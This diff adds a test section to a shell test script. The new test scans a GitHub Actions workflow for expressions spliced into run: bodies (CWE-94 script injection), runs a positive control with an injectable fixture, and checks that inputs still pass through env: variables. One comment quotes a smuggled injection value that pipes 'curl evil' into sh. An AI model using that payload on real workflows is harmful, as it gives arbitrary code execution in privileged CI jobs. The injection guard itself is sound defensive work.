@@ -220,6 +220,73 @@ else
   bad "the rate-limit arm does not warn against 'gh auth login' — the operator's obvious next move destroys a valid credential"
 fi
 
+
+# ---------------------------------------------------------------------------
+# 13. NO EXPRESSION IN A `run:` BODY. GitHub evaluates a ${ {…} } expression and
+#     splices the RESULT into the script text before bash ever parses it, so an
+#     input pasted into a run body is CWE-94 script injection: a dispatch with
+#     limit = `0"; curl evil | sh; #` executes arbitrary code in a job holding a
+#     GitHub App installation token with administration:write over 439 repos.
+#     MEASURED: the first version of this workflow did exactly that on three
+#     steps, and SonarCloud failed the PR with "E Security Rating on New Code" —
+#     the only required context that was red for a reason belonging to this
+#     branch. Inputs must arrive through `env:`, where they are data.
+WF="$ROOT/.github/workflows/tag-ruleset-canon.yml"
+# shellcheck disable=SC2016
+scan_run_bodies() {
+  awk '
+    /^ *run: *\|/ { match($0, /^ */); ind = RLENGTH; inrun = 1; next }
+    inrun {
+      if ($0 ~ /^[[:space:]]*$/) next
+      match($0, /^ */); cur = RLENGTH
+      if (cur <= ind) { inrun = 0; next }
+      if (index($0, "${{")) print FILENAME ":" NR ": " $0
+    }
+  ' "$1"
+}
+if [ ! -f "$WF" ]; then
+  bad "the applier workflow is missing — the injection guard cannot run"
+else
+  hits=$(scan_run_bodies "$WF")
+  if [ -z "$hits" ]; then
+    ok "no GitHub expression is interpolated into any run: body (no script injection)"
+  else
+    bad "a GitHub expression is spliced into a run: body — CWE-94 script injection in a job holding administration:write: $(printf '%s' "$hits" | head -3 | tr '\n' ' ')"
+  fi
+
+  # POSITIVE CONTROL. An assertion that only ever reports "clean" is worthless
+  # unless it has been shown to go red. Feed the same scanner a workflow that
+  # IS injectable and require a hit; otherwise the green above proves nothing.
+  ctl=$(mktemp)
+  cat > "$ctl" <<'CTL'
+jobs:
+  x:
+    steps:
+      - name: injectable
+        run: |
+          echo "LIMIT=${{ inputs.limit }}"
+CTL
+  if [ -n "$(scan_run_bodies "$ctl")" ]; then
+    ok "the injection scanner detects a known-bad workflow (positive control)"
+  else
+    bad "the injection scanner does NOT flag a deliberately injectable run body — the clean result above is meaningless"
+  fi
+  rm -f "$ctl"
+
+  # The fix must not have been a feature deletion: every input still has to reach
+  # the script. Each IN_* name must be BOTH declared in an env: block and read in
+  # a run body, or the flag it controls has silently stopped working.
+  missing=""
+  for v in IN_APPLY IN_RECONCILE IN_LIMIT; do
+    grep -q "^ *$v: " "$WF" || missing="$missing $v(env)"
+    grep -q "\$$v" "$WF" || missing="$missing $v(use)"
+  done
+  if [ -z "$missing" ]; then
+    ok "each workflow input still reaches the applier through an env: variable"
+  else
+    bad "the injection fix dropped an input instead of rerouting it:$missing"
+  fi
+fi
 echo "---"
 echo "passed=$pass failed=$fail"
 [ "$fail" -eq 0 ]
